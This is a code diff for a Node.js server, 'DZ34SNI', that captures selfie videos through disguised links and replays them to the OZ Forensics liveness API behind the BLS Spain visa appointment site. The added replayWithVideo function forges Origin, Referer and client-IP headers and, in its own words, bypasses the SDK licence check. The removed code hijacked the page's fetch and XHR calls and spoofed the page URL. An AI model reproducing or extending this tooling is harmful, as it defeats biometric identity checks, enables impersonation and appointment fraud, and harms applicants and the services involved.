@@ -534,8 +534,16 @@ app.post('/api/replay/:id', async (req, res) => {
  */
 async function replayPreselfie(preselfieId, newUserId, newTransactionId, newIp, phone) {
     const ps = preSelfies[preselfieId];
-    if (!ps || !ps.captures || ps.captures.length === 0) {
-        throw new Error('No capture data');
+    if (!ps) throw new Error('Pre-selfie not found');
+
+    // VIDEO-based pre-selfie (new method)
+    if (ps.videoData) {
+        return await replayWithVideo(ps, newUserId, newTransactionId, newIp, phone);
+    }
+
+    // CAPTURE-based pre-selfie (legacy method)
+    if (!ps.captures || ps.captures.length === 0) {
+        throw new Error('No capture data and no video');
     }
 
     console.log(`[REPLAY] ▶ Starting replay "${ps.label}" for userId=${newUserId.substring(0, 15)}... IP=${newIp}`);
@@ -651,6 +659,113 @@ async function replayPreselfie(preselfieId, newUserId, newTransactionId, newIp, 
 /**
  * Helper: Make an HTTPS request and return the response
  */
+/**
+ * Replay using saved video: send to OZ API server-side
+ * This bypasses the SDK license check entirely!
+ */
+async function replayWithVideo(ps, newUserId, newTransactionId, newIp, phone) {
+    console.log(`[REPLAY-VIDEO] ▶ Starting video replay "${ps.label}" userId=${newUserId.substring(0, 15)}...`);
+    
+    const videoBuf = Buffer.from(ps.videoData, 'base64');
+    console.log(`[REPLAY-VIDEO] Video size: ${(videoBuf.length / 1024).toFixed(1)}KB`);
+
+    // Step 1: Create OZ session
+    const sessionResult = await proxyRequest({
+        hostname: 'api-spain.ozforensics.com',
+        path: '/api/v1/session',
+        method: 'POST',
+        headers: {
+            'Host': 'api-spain.ozforensics.com',
+            'Content-Type': 'application/json',
+            'Origin': 'https://algeria.blsspainglobal.com',
+            'Referer': 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest',
+            'User-Agent': 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
+            'X-Forwarded-For': newIp || '41.100.50.1',
+            'X-Real-IP': newIp || '41.100.50.1'
+        },
+        body: Buffer.from(JSON.stringify({
+            user_id: newUserId,
+            transaction_id: newTransactionId,
+            meta: { user_id: newUserId, transaction_id: newTransactionId }
+        }))
+    });
+
+    let sessionId = null;
+    try {
+        const sData = JSON.parse(sessionResult.body.toString());
+        sessionId = sData.session_id || sData.id || sData.event_session_id;
+        console.log(`[REPLAY-VIDEO] Session created: ${sessionId ? sessionId.substring(0, 20) + '...' : 'UNKNOWN'}`);
+    } catch(e) {
+        console.log(`[REPLAY-VIDEO] Session response: ${sessionResult.status} — ${sessionResult.body.toString().substring(0, 200)}`);
+    }
+
+    // Step 2: Upload video to OZ for liveness check
+    const boundary = '----DZ34SNI' + crypto.randomBytes(8).toString('hex');
+    
+    let multipartBody = '';
+    multipartBody += '--' + boundary + '\r\n';
+    multipartBody += 'Content-Disposition: form-data; name="user_id"\r\n\r\n' + newUserId + '\r\n';
+    multipartBody += '--' + boundary + '\r\n';
+    multipartBody += 'Content-Disposition: form-data; name="transaction_id"\r\n\r\n' + newTransactionId + '\r\n';
+    if (sessionId) {
+        multipartBody += '--' + boundary + '\r\n';
+        multipartBody += 'Content-Disposition: form-data; name="session_id"\r\n\r\n' + sessionId + '\r\n';
+    }
+    multipartBody += '--' + boundary + '\r\n';
+    multipartBody += 'Content-Disposition: form-data; name="video"; filename="selfie.webm"\r\n';
+    multipartBody += 'Content-Type: video/webm\r\n\r\n';
+
+    const prefix = Buffer.from(multipartBody, 'latin1');
+    const suffix = Buffer.from('\r\n--' + boundary + '--\r\n', 'latin1');
+    const fullBody = Buffer.concat([prefix, videoBuf, suffix]);
+
+    const uploadResult = await proxyRequest({
+        hostname: 'api-spain.ozforensics.com',
+        path: '/api/v1/liveness',
+        method: 'POST',
+        headers: {
+            'Host': 'api-spain.ozforensics.com',
+            'Content-Type': 'multipart/form-data; boundary=' + boundary,
+            'Content-Length': fullBody.length,
+            'Origin': 'https://algeria.blsspainglobal.com',
+            'Referer': 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest',
+            'User-Agent': 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
+            'X-Forwarded-For': newIp || '41.100.50.1',
+            'X-Real-IP': newIp || '41.100.50.1'
+        },
+        body: fullBody
+    });
+
+    console.log(`[REPLAY-VIDEO] Upload response: ${uploadResult.status}`);
+    
+    let eventSessionId = sessionId;
+    try {
+        const uData = JSON.parse(uploadResult.body.toString());
+        console.log(`[REPLAY-VIDEO] Response data:`, JSON.stringify(uData).substring(0, 300));
+        if (uData.event_session_id) eventSessionId = uData.event_session_id;
+        if (uData.session_id) eventSessionId = uData.session_id;
+        if (uData.data && uData.data.event_session_id) eventSessionId = uData.data.event_session_id;
+    } catch(e) {
+        // Try string match
+        const bodyStr = uploadResult.body.toString();
+        const m = bodyStr.match(/"event_session_id"\s*:\s*"([^"]+)"/);
+        if (m) eventSessionId = m[1];
+        console.log(`[REPLAY-VIDEO] Raw response: ${bodyStr.substring(0, 300)}`);
+    }
+
+    // Update stats
+    ps.lastUsed = Date.now();
+    ps.useCount = (ps.useCount || 0) + 1;
+
+    if (eventSessionId) {
+        console.log(`[REPLAY-VIDEO] ✅ Complete! session=${eventSessionId.substring(0, 25)}...`);
+    } else {
+        console.log(`[REPLAY-VIDEO] ⚠️ Complete but no session_id found`);
+    }
+
+    return eventSessionId;
+}
+
 function proxyRequest({ hostname, path, method, headers, body }) {
     return new Promise((resolve, reject) => {
         const opts = { hostname, port: 443, path, method, headers, timeout: 30000 };
@@ -679,306 +794,420 @@ function proxyRequest({ hostname, path, method, headers, body }) {
 // ═══════════════════════════════════════════════════
 // ★ ENCRYPTION + LINK GENERATION ★
 // ═══════════════════════════════════════════════════
+// ★ PRE-SELFIE PAGE (face-api.js — NO OZ SDK) ★
+// ═══════════════════════════════════════════════════
 
-function encryptData(data) {
-    const key = crypto.scryptSync(LINK_SECRET, 'dz34sni_salt', 32);
+// Save video from pre-selfie capture
+app.post('/api/preselfie/save-video', (req, res) => {
+    const contentType = req.headers['content-type'] || '';
+    
+    if (!contentType.includes('multipart/form-data')) {
+        return res.status(400).json({ ok: false, error: 'Expected multipart/form-data' });
+    }
+
+    const chunks = [];
+    req.on('data', chunk => chunks.push(chunk));
+    req.on('end', () => {
+        const body = Buffer.concat(chunks);
+        
+        // Parse multipart to extract fields
+        const boundary = contentType.split('boundary=')[1];
+        if (!boundary) return res.status(400).json({ ok: false, error: 'No boundary' });
+
+        const parts = parseMultipart(body, boundary);
+        const label = parts.label || 'Unknown';
+        const phone = parts.phone || '';
+        const linkId = parts.linkId || '';
+        const videoData = parts.video; // Buffer
+
+        if (!videoData || videoData.length < 1000) {
+            return res.status(400).json({ ok: false, error: 'No video data or too small' });
+        }
+
+        const id = 'ps_' + crypto.randomBytes(6).toString('hex');
+        
+        preSelfies[id] = {
+            id,
+            label: label.trim(),
+            phone: phone.trim(),
+            videoData: videoData.toString('base64'),
+            videoSize: videoData.length,
+            captureCount: 1,
+            createdAt: Date.now(),
+            lastUsed: null,
+            useCount: 0,
+            status: 'ready'
+        };
+
+        // Auto-map phone if provided
+        if (phone.trim()) {
+            phonePreselfieMap[phone.trim()] = id;
+        }
+
+        // Mark link as completed
+        if (linkId && generatedLinks[linkId]) {
+            generatedLinks[linkId].completed = true;
+            generatedLinks[linkId].preselfieId = id;
+        }
+
+        console.log(`[PRE-SELFIE] 💾 Video saved: "${label}" (${id}) — ${(videoData.length / 1024).toFixed(1)}KB — phone: ${phone || 'none'}`);
+        res.json({ ok: true, id, videoSize: videoData.length });
+    });
+});
+
+// Simple multipart parser
+function parseMultipart(body, boundary) {
+    const result = {};
+    const sep = Buffer.from('--' + boundary);
+    const parts = [];
+    let start = 0;
+    
+    while (true) {
+        const idx = body.indexOf(sep, start);
+        if (idx === -1) break;
+        if (start > 0) parts.push(body.slice(start, idx));
+        start = idx + sep.length;
+        // Skip \r\n after boundary
+        if (body[start] === 0x0d) start += 2;
+        else if (body[start] === 0x0a) start += 1;
+    }
+
+    for (const part of parts) {
+        const headerEnd = part.indexOf('\r\n\r\n');
+        if (headerEnd === -1) continue;
+        const headers = part.slice(0, headerEnd).toString();
+        const content = part.slice(headerEnd + 4);
+        // Trim trailing \r\n
+        const trimmed = (content.length >= 2 && content[content.length - 2] === 0x0d) 
+            ? content.slice(0, -2) : content;
+        
+        const nameMatch = headers.match(/name="([^"]+)"/);
+        if (!nameMatch) continue;
+        const name = nameMatch[1];
+        
+        if (headers.includes('filename=')) {
+            result[name] = trimmed; // Keep as Buffer for files
+        } else {
+            result[name] = trimmed.toString().trim();
+        }
+    }
+    return result;
+}
+
+
+// ═══════════════════════════════════════════
+// ★ ENCRYPTED LINKS (like /ai?Data=...)  ★
+// ═══════════════════════════════════════════
+
+function encryptLink(data) {
+    const key = crypto.createHash('sha256').update(LINK_SECRET).digest();
     const iv = crypto.randomBytes(16);
     const cipher = crypto.createCipheriv(LINK_ALGO, key, iv);
-    let enc = cipher.update(JSON.stringify(data), 'utf8', 'base64');
-    enc += cipher.final('base64');
-    return iv.toString('base64') + '.' + enc;
+    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
+    encrypted += cipher.final('base64');
+    return iv.toString('base64') + ':' + encrypted;
 }
 
-function decryptData(token) {
+function decryptLink(token) {
     try {
-        const key = crypto.scryptSync(LINK_SECRET, 'dz34sni_salt', 32);
-        const parts = token.split('.');
-        if (parts.length !== 2) return null;
-        const decipher = crypto.createDecipheriv(LINK_ALGO, key, Buffer.from(parts[0], 'base64'));
-        let dec = decipher.update(parts[1], 'base64', 'utf8');
-        dec += decipher.final('utf8');
-        return JSON.parse(dec);
-    } catch(e) { return null; }
+        const key = crypto.createHash('sha256').update(LINK_SECRET).digest();
+        const parts = token.split(':');
+        if (parts.length < 2) return null;
+        const iv = Buffer.from(parts[0], 'base64');
+        const encrypted = parts.slice(1).join(':');
+        const decipher = crypto.createDecipheriv(LINK_ALGO, key, iv);
+        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
+        decrypted += decipher.final('utf8');
+        return JSON.parse(decrypted);
+    } catch(e) {
+        console.log('[LINK] Decrypt error:', e.message);
+        return null;
+    }
 }
 
-function errorPage(title, sub) {
-    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Erreur</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0f172a;font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center;padding:20px}.card{background:#1e293b;border-radius:16px;padding:40px 30px;border:1px solid #334155;max-width:400px}h1{font-size:20px;color:#f87171;margin-bottom:10px}p{font-size:14px;color:#94a3b8}</style></head><body><div class="card"><div style="font-size:50px;margin-bottom:16px">&#x274C;</div><h1>${title}</h1><p>${sub}</p></div></body></html>`;
-}
+// GET /ai?Data=<encrypted> — Client opens this link on phone
+app.get('/ai', (req, res) => {
+    const token = req.query.Data;
+    if (!token) return res.status(400).send(expiredPage('Lien invalide'));
+    
+    const data = decryptLink(token);
+    if (!data) return res.status(400).send(expiredPage('Lien invalide ou corrompu'));
+    
+    // Check expiration
+    if (data.expiresAt && Date.now() > data.expiresAt) {
+        return res.status(410).send(expiredPage('Ce lien a expiré'));
+    }
 
-function alreadyDonePage(label) {
-    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OK</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#059669,#0d9488);font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center;padding:20px}.card{background:rgba(255,255,255,.12);border-radius:16px;padding:40px 30px;border:1px solid rgba(255,255,255,.2);max-width:400px}h1{font-size:20px;margin-bottom:10px}p{font-size:14px;color:rgba(255,255,255,.8)}</style></head><body><div class="card"><div style="font-size:50px;margin-bottom:16px">&#x2705;</div><h1>Selfie deja enregistre</h1><p>"${label}" - Verification effectuee.</p></div></body></html>`;
-}
+    // Check if link was already used
+    if (data.linkId && generatedLinks[data.linkId] && generatedLinks[data.linkId].completed) {
+        return res.status(410).send(expiredPage('Ce lien a déjà été utilisé'));
+    }
 
-app.post('/api/generate-link', (req, res) => {
-    const { label, phone } = req.body || {};
-    if (!label) return res.status(400).json({ ok: false, error: 'Missing label' });
-    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
-    const linkId = 'lnk_' + crypto.randomBytes(6).toString('hex');
-    const captureSession = 'preselfie_' + crypto.randomBytes(8).toString('hex');
-    const payload = { id: linkId, cs: captureSession, label: label.trim(), phone: (phone || '').trim(), ts: Date.now(), exp: Date.now() + 7*24*60*60*1000 };
-    const token = encryptData(payload);
-    const encodedToken = encodeURIComponent(token);
-    const link = `${serverUrl}/s?d=${encodedToken}`;
-    generatedLinks[linkId] = { id: linkId, label: label.trim(), phone: (phone || '').trim(), captureSession, link, used: false, completed: false, preselfieId: null, createdAt: Date.now() };
-    console.log(`[LINK] Generated for "${label}": ${linkId}`);
-    res.json({ ok: true, linkId, link, token: encodedToken });
+    // Redirect to pre-selfie page with params
+    const params = new URLSearchParams({
+        label: data.label || 'Client',
+        phone: data.phone || '',
+        linkId: data.linkId || ''
+    });
+    
+    // Serve the pre-selfie page directly (not redirect, to keep BLS-like URL)
+    req.query.label = data.label;
+    req.query.phone = data.phone;
+    req.query.linkId = data.linkId;
+    
+    // Fall through to pre-selfie handler by redirecting internally
+    res.redirect('/pre-selfie?' + params.toString());
 });
 
+function expiredPage(msg) {
+    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Lien Expiré</title></head>
+<body style="margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#121212;font-family:system-ui,sans-serif;color:#fff;text-align:center;padding:20px">
+<div><div style="font-size:64px;margin-bottom:20px">⏰</div><div style="font-size:24px;font-weight:700;margin-bottom:10px;color:#ff4d4f">${msg}</div>
+<div style="font-size:14px;color:#94a3b8">Demandez un nouveau lien à votre agent</div></div></body></html>`;
+}
+
+// POST /api/generate-link — Generate encrypted link (from dashboard)
+app.post('/api/generate-link', express.json(), (req, res) => {
+    const { label, phone, expirationMinutes } = req.body || {};
+    if (!label) return res.status(400).json({ ok: false, error: 'Label required' });
+
+    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
+    const linkId = 'lnk_' + crypto.randomBytes(8).toString('hex');
+    const expMin = parseInt(expirationMinutes) || 10;
+    
+    const data = {
+        label: label.trim(),
+        phone: (phone || '').trim(),
+        linkId: linkId,
+        expiresAt: Date.now() + (expMin * 60 * 1000),
+        createdAt: Date.now()
+    };
+
+    const token = encryptLink(data);
+    const link = serverUrl + '/ai?Data=' + encodeURIComponent(token);
+
+    // Store link metadata
+    generatedLinks[linkId] = {
+        label: data.label,
+        phone: data.phone,
+        createdAt: Date.now(),
+        expiresAt: data.expiresAt,
+        expirationMinutes: expMin,
+        completed: false,
+        preselfieId: null,
+        link: link
+    };
+
+    console.log(`[LINK] Generated: "${label}" phone=${phone || 'none'} expires=${expMin}min id=${linkId}`);
+    res.json({ ok: true, link, linkId, expiresAt: data.expiresAt });
+});
+
+// GET /api/links — List generated links
 app.get('/api/links', (req, res) => {
-    const list = Object.values(generatedLinks).map(l => ({ id: l.id, label: l.label, phone: l.phone, link: l.link, used: l.used, completed: l.completed, createdAt: l.createdAt }));
-    res.json({ ok: true, links: list });
+    const links = Object.entries(generatedLinks).map(([id, l]) => ({
+        id,
+        label: l.label,
+        phone: l.phone,
+        createdAt: l.createdAt,
+        expiresAt: l.expiresAt,
+        expired: Date.now() > l.expiresAt,
+        completed: l.completed,
+        preselfieId: l.preselfieId,
+        link: l.link
+    })).sort((a, b) => b.createdAt - a.createdAt);
+
+    res.json({ ok: true, links });
 });
 
-app.delete('/api/link/:id', (req, res) => { delete generatedLinks[req.params.id]; res.json({ ok: true }); });
-
-app.get('/s', (req, res) => {
-    const token = req.query.d;
-    if (!token) return res.status(400).send(errorPage('Lien invalide', 'Token manquant'));
-    const data = decryptData(decodeURIComponent(token));
-    if (!data) return res.status(400).send(errorPage('Lien invalide', 'Token corrompu'));
-    if (data.exp && Date.now() > data.exp) return res.status(410).send(errorPage('Lien expire', 'Ce lien a expire.'));
-    const linkInfo = generatedLinks[data.id];
-    if (linkInfo && linkInfo.completed) return res.send(alreadyDonePage(data.label));
-    if (linkInfo) linkInfo.used = true;
-    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
-    const url = `${serverUrl}/pre-selfie?label=${encodeURIComponent(data.label)}&phone=${encodeURIComponent(data.phone || '')}&cs=${encodeURIComponent(data.cs)}&linkId=${encodeURIComponent(data.id)}`;
-    res.redirect(302, url);
-});
-
-
-// ★ PRE-SELFIE PAGE ★
-// ═══════════════════════════════════════════════════
 
 app.get('/pre-selfie', (req, res) => {
     const { label, phone, realIp } = req.query;
     const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
-    
-    // Generate unique capture session ID
-    const captureSession = req.query.cs || ('preselfie_' + crypto.randomBytes(8).toString('hex'));
     const linkId = req.query.linkId || '';
     
     const esc = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
     const safeLabel = esc(label || 'Unknown');
     const safePhone = esc(phone || '');
-    const safeIp = esc(realIp || '');
-
-    // Temp userId/transactionId for pre-selfie
-    const tempUserId = 'preselfie-' + crypto.randomBytes(16).toString('hex');
-    const tempTransactionId = 'preselfie-' + crypto.randomBytes(16).toString('hex');
+    const safeLinkId = esc(linkId);
 
     const html = `<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>DZ34SNI — Pre-Selfie</title>
+<title>Selfie Verification</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh;color:#f1f5f9}
-.header{background:linear-gradient(135deg,#dc2626,#b91c1c);padding:16px 20px;text-align:center}
-.header h1{font-size:20px;font-weight:900;color:#fff}
-.header p{font-size:12px;color:rgba(255,255,255,.7);margin-top:4px}
-.info{padding:16px;background:#1e293b;margin:12px;border-radius:12px;border:1px solid #334155}
-.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px}
-.info-row .lbl{color:#94a3b8}
-.info-row .val{color:#f1f5f9;font-weight:700}
-#st{text-align:center;padding:12px;font-size:14px;font-weight:700;color:#0d9488}
-.ld{position:fixed;inset:0;z-index:9999;background:#0f172a;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
-.ld .logo{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#b91c1c);display:flex;align-items:center;justify-content:center;margin-bottom:16px;box-shadow:0 8px 32px rgba(220,38,38,.4)}
-.ld .logo span{font-size:38px;font-weight:900}
-.ld h2{font-size:18px;font-weight:700;margin-bottom:8px}
-.ld p{font-size:12px;color:#94a3b8}
-.ld-spin{width:40px;height:40px;border:4px solid rgba(255,255,255,.1);border-top-color:#dc2626;border-radius:50%;animation:sp .8s linear infinite;margin-top:20px}
+body{background:#121212;font-family:system-ui,sans-serif;min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.video-container{position:relative;width:340px;height:440px;border:3px solid #00bfff;border-radius:12px;overflow:hidden;margin-bottom:10px}
+video{width:100%;height:100%;object-fit:cover;background:#000}
+.face-overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:70%;height:60%;border-radius:50%;border:3px solid rgba(0,191,255,0.8)}
+#face-warning{position:absolute;top:10px;left:50%;transform:translateX(-50%);background:rgba(255,0,0,0.7);padding:6px 12px;border-radius:8px;display:none;font-weight:bold;font-size:13px;white-space:nowrap}
+#overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:center;color:#00bfff;font-weight:bold;flex-direction:column;z-index:9999;font-size:18px}
+.spin{width:40px;height:40px;border:4px solid rgba(0,191,255,.2);border-top-color:#00bfff;border-radius:50%;animation:sp .8s linear infinite;margin-top:16px}
 @keyframes sp{to{transform:rotate(360deg)}}
-#ok-screen{position:fixed;inset:0;z-index:2147483647;display:none;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#059669,#0d9488);text-align:center;padding:30px}
-.chk{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;margin-bottom:20px;animation:pop .5s ease-out}
-@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
-.ozliveness_logo,.ozliveness_version{display:none!important}
+h2{font-size:20px;margin-bottom:12px;text-align:center}
+.info{font-size:12px;color:#94a3b8;margin-bottom:8px;text-align:center}
 </style>
 </head>
 <body>
 
-<div class="ld" id="ld">
-    <div class="logo"><span>D</span></div>
-    <h2>PRE-SELFIE</h2>
-    <p>Préparation de la capture...</p>
-    <p style="margin-top:8px;font-size:11px;color:#dc2626">MODE CAPTURE — ${safeLabel}</p>
-    <div class="ld-spin"></div>
+<h2>🐉 DZ34SNI — Selfie</h2>
+<p class="info">Client: <b>${safeLabel}</b></p>
+
+<div class="video-container">
+  <video id="video" autoplay muted playsinline></video>
+  <div class="face-overlay" id="circle"></div>
+  <div id="face-warning">❌ Align your face</div>
 </div>
 
-<div class="header">
-    <h1>🐉 DZ34SNI — PRE-SELFIE</h1>
-    <p>Capture biométrique pour: <b>${safeLabel}</b></p>
+<div id="overlay">
+  <span id="overlay-text">Processing selfie...</span>
+  <div class="spin"></div>
 </div>
 
-<div class="info">
-    <div class="info-row"><span class="lbl">Personne</span><span class="val">${safeLabel}</span></div>
-    <div class="info-row"><span class="lbl">Téléphone</span><span class="val">${safePhone || '—'}</span></div>
-    <div class="info-row"><span class="lbl">Session</span><span class="val" style="font-size:10px">${captureSession.substring(0, 20)}...</span></div>
-</div>
-
-<div id="st">Initialisation proxy capture...</div>
-
-<div id="ok-screen">
-    <div class="chk"><span style="font-size:50px;color:#fff">&#10003;</span></div>
-    <p style="font-size:28px;font-weight:900;color:#fff;margin-bottom:8px">PRE-SELFIE SAUVEGARDÉ !</p>
-    <p style="font-size:16px;color:rgba(255,255,255,.8)" id="ok-detail"></p>
-    <p style="font-size:14px;color:rgba(255,255,255,.6);margin-top:12px" id="ok-count"></p>
-    <a href="/dashboard" style="display:inline-block;margin-top:20px;padding:12px 24px;background:rgba(255,255,255,.2);color:#fff;border-radius:10px;text-decoration:none;font-weight:700">← Dashboard</a>
-</div>
-
-<!-- URL spoof for OZ SDK -->
-<script>try{history.replaceState({},'','/dza/appointment/LivenessRequest');}catch(e){}</script>
-
-<!-- Intercept ozforensics → proxy with capture -->
+<script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.min.js"></script>
 <script>
-(function(){
-    var CS = '${captureSession}';
-    var PB = '${serverUrl}/oz-proxy/' + encodeURIComponent(CS) + '/';
+const video = document.getElementById("video");
+const warning = document.getElementById("face-warning");
+const overlay = document.getElementById("overlay");
+const overlayText = document.getElementById("overlay-text");
+const circle = document.getElementById("circle");
+let stream, recorder, chunks = [], recordingStarted = false, frontalStart = null;
 
-    function rw(url) {
-        if (typeof url !== 'string') return url;
-        var m = url.match(/^https?:\\/\\/([^/]*ozforensics\\.com)(\\/.*)$/);
-        return m ? PB + m[1] + m[2] : url;
-    }
+const SRV = '${serverUrl}';
+const LABEL = '${safeLabel}';
+const PHONE = '${safePhone}';
+const LINK_ID = '${safeLinkId}';
 
-    var _f = window.fetch;
-    window.fetch = function(i, o) {
-        if (typeof i === 'string') i = rw(i);
-        else if (i && i.url) { var u = rw(i.url); if (u !== i.url) i = new Request(u, i); }
-        return _f.call(this, i, o);
-    };
-
-    var _xo = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(m, u) {
-        arguments[1] = rw(u);
-        return _xo.apply(this, arguments);
-    };
-
-    var _ce = document.createElement.bind(document);
-    document.createElement = function(tag) {
-        var el = _ce(tag);
-        if (tag.toLowerCase() === 'script') {
-            var d = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
-            if (d && d.set) {
-                Object.defineProperty(el, 'src', {
-                    set: function(v) { d.set.call(this, rw(v)); },
-                    get: function() { return d.get.call(this); },
-                    configurable: true
-                });
-            }
-        }
-        if (tag.toLowerCase() === 'link') {
-            var d2 = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href');
-            if (d2 && d2.set) {
-                Object.defineProperty(el, 'href', {
-                    set: function(v) { d2.set.call(this, rw(v)); },
-                    get: function() { return d2.get.call(this); },
-                    configurable: true
-                });
-            }
-        }
-        return el;
-    };
-
-    var _Im = window.Image;
-    window.Image = function(w, h) {
-        var img = new _Im(w, h);
-        var d = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
-        if (d && d.set) {
-            Object.defineProperty(img, 'src', {
-                set: function(v) { d.set.call(this, rw(v)); },
-                get: function() { return d.get.call(this); },
-                configurable: true
-            });
-        }
-        return img;
-    };
-    window.Image.prototype = _Im.prototype;
-
-    document.getElementById('st').textContent = 'Proxy capture OK — chargement SDK...';
-    console.log('[DZ34SNI] Pre-selfie capture proxy: ' + PB);
-})();
-</script>
-
-<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
-    <input type="hidden" name="event_session_id" id="event_session_id" value="">
-    <input type="hidden" name="LivenessId" id="LivenessId" value="">
-</form>
-
-<!-- Load OZ SDK through proxy (enables origin patching) -->
-<script src="${serverUrl}/oz-proxy/${encodeURIComponent(captureSession)}/web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>
-
-<!-- Launch and capture -->
-<script>
-var __cs = '${captureSession}', __srv = '${serverUrl}', __label = '${safeLabel}', __phone = '${safePhone}', __linkId = '${esc(linkId)}', __sent = false;
-
-function savePreselfie(sid) {
-    if (__sent) return; __sent = true;
-    document.getElementById('st').textContent = 'Sauvegarde du pre-selfie...';
-
-    var url = __srv + '/api/preselfie/save';
-    var body = JSON.stringify({
-        captureSession: __cs,
-        label: __label,
-        phone: __phone,
-        sessionId: sid
+async function initCamera() {
+    stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: 640, height: 480, facingMode: "user" },
+        audio: false
     });
-
-    fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: body, cache: 'no-store' })
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            if (d.ok) {
-                document.getElementById('ok-detail').textContent = '"' + __label + '" — ' + d.captureCount + ' requêtes capturées';
-                document.getElementById('ok-count').textContent = 'ID: ' + d.id;
-                document.getElementById('ok-screen').style.display = 'flex';
-                document.getElementById('st').textContent = 'Pre-selfie sauvegardé !';
-                console.log('[DZ34SNI] Pre-selfie saved:', d.id);
-            } else {
-                document.getElementById('st').textContent = 'ERREUR: ' + (d.error || 'save failed');
-            }
-        })
-        .catch(function(e) {
-            document.getElementById('st').textContent = 'ERREUR: ' + e.message;
-        });
+    video.srcObject = stream;
+    await video.play();
 }
 
-window.addEventListener('load', function() {
-    document.getElementById('st').textContent = 'SDK chargé — lancement selfie...';
+function isFrontal(landmarks) {
+    if (!landmarks) return false;
+    const leftEye = landmarks.getLeftEye();
+    const rightEye = landmarks.getRightEye();
+    const nose = landmarks.getNose();
+    if (!leftEye || !rightEye || !nose) return false;
+    const dx = nose[3].x - (leftEye[0].x + rightEye[3].x) / 2;
+    return Math.abs(dx) < 10;
+}
 
-    setTimeout(function() {
-        var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
-        try {
-            if (typeof OzLiveness === 'undefined') {
-                document.getElementById('st').textContent = 'ERREUR: SDK non chargé';
-                return;
+function inCircle(box) {
+    if (!box) return false;
+    const vw = video.videoWidth, vh = video.videoHeight;
+    const cw = circle.offsetWidth * (vw / video.offsetWidth);
+    const ch = circle.offsetHeight * (vh / video.offsetHeight);
+    const cx = vw / 2, cy = vh / 2;
+    const radius = (Math.min(cw, ch) / 2) * 0.7;
+    const fx = box.x + box.width / 2, fy = box.y + box.height / 2;
+    return Math.hypot(fx - cx, fy - cy) < radius;
+}
+
+async function monitorFace() {
+    const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 160, scoreThreshold: 0.5 });
+    
+    async function loop() {
+        if (!video.videoWidth) return requestAnimationFrame(loop);
+        const det = await faceapi.detectSingleFace(video, options).withFaceLandmarks();
+        
+        if (det && det.landmarks && isFrontal(det.landmarks) && inCircle(det.detection.box)) {
+            warning.style.display = "block";
+            warning.textContent = "✅ Perfect!";
+            warning.style.background = "rgba(46,204,113,0.7)";
+            warning.style.color = "#000";
+            circle.style.borderColor = "limegreen";
+            if (!frontalStart) frontalStart = Date.now();
+            if (!recordingStarted && Date.now() - frontalStart > 2000) {
+                startRecording();
             }
-            document.getElementById('st').textContent = 'Selfie en cours — REGARDEZ LA CAMERA...';
-            OzLiveness.open({
-                lang: 'en',
-                meta: { 'user_id': '${tempUserId}', 'transaction_id': '${tempTransactionId}' },
-                overlay_options: false,
-                action: ['video_selfie_blank'],
-                result_mode: 'safe',
-                on_complete: function(r) {
-                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
-                    if (sid) {
-                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
-                        savePreselfie(sid);
-                    } else {
-                        document.getElementById('st').textContent = 'ERREUR: pas de session ID';
-                    }
-                },
-                on_error: function(e) {
